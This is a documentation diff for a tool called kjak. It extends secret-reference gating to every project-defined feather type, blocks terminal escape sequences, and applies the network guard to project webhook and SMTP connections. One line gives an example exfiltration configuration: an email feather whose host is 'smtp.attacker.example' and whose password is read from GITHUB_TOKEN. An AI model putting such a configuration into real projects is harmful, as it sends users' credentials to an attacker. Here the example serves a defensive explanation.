@@ -119,17 +119,36 @@ rules that keep your secrets from it:
    even in a trusted project. kjak's own edits of a trusted project file
    (`feather add --scope project`) keep the allowed names the new content
    still uses and allow no new one.
-5. `env` and `keychain` references of a project's slack, discord and email
-   feathers are, as before, shown by `config trust` and allowed by trusting
-   the file: reviewing them is your part. Those of a project's **http**
-   feathers — which send to a URL the project chooses — and of its external
-   feathers (plugins), with every variable a project gives a plugin
-   (`env = [...]`), are allowed by name like the personal secrets above
-   (`env:NAME`, `keychain:SERVICE/ACCOUNT` in `user_secrets`); any other is
-   refused when it is resolved.
+5. `env` and `keychain` references of **every** feather of a project are
+   allowed by name like the personal secrets above (`env:NAME`,
+   `keychain:SERVICE/ACCOUNT` in `user_secrets`); any other is refused when
+   it is resolved. Every feather type sends to a destination the project
+   chooses: an http feather to its URL, an external feather to its plugin,
+   an email feather to its SMTP `host` (which receives the password with
+   `AUTH`), a slack or discord feather to its webhook URL. Trusting the
+   content of a repository does not hand it your environment: a project
+   with `type = "email"`, `host = "smtp.attacker.example"` and
+   `password = { env = "GITHUB_TOKEN" }` would otherwise send the token to
+   that server. Every variable a project gives a plugin (`env = [...]`) is
+   allowed the same way. Before kjak 0.0.5 only the http and external
+   feathers were gated: see [Migration](migration.md#project-env-and-keychain-references-need-a-grant).
 
 An allowed name means "this project may send this secret to the
 destinations it configures": review those destinations before you allow it.
+
+### Terminal output
+
+What `config trust` shows must be what the file says: a project file cannot
+write terminal escape sequences through kjak. The free-text fields of a
+feather (`host`, `user`, `from`, `to`, `subject_prefix`, `username`,
+`plugin`, `path`, plugin `settings`, http `query` keys, `allow_hosts`,
+`auth.username`, a keychain `service`/`account`) refuse control characters
+(C0 including ESC, BEL, tab and line breaks; DEL; C1). Values are printed
+as they are when every character is printable, and quoted (Go `%q`
+syntax, which also escapes bidirectional overrides) otherwise; plugin
+settings and http headers are always quoted. Unknown keys are quoted in
+errors, every error is printed with its control characters escaped, and a
+template's text keeps only its line breaks and tabs.
 
 ## OS keychain
 
@@ -248,6 +267,24 @@ this machine can reach: its own services, the cloud metadata endpoint
 Limits: a host name allowed with `allow_hosts` is trusted for every private
 address its DNS returns. The guard cannot see through an HTTP proxy, which
 is why none is used. Responses are read up to `max_response_bytes`.
+
+### A project's slack, discord and email feathers
+
+A project chooses the webhook URL of its slack and discord feathers and the
+SMTP host of its email feathers as freely as the URL of an http feather.
+Their connections go through the same guard (same address categories, same
+`allow_networks` / `allow_hosts`, metadata never), and `config trust` shows
+the host of a literal webhook URL and the address policy of each. They use
+no proxy: with `HTTPS_PROXY` set, a project's webhook feather still connects
+directly (the guard cannot check a destination behind a proxy); if your
+network only reaches the internet through a proxy, define that feather in
+your global file. A refused destination is the error code `blocked`, not
+retried.
+
+Your global file's feathers are not restricted: their destinations are
+yours, local relays and private SMTP servers are common there, and they keep
+the proxy environment variables. Moving a feather to the global file is
+the explicit way to give it the network access of your own configuration.
 
 ## External plugins
 
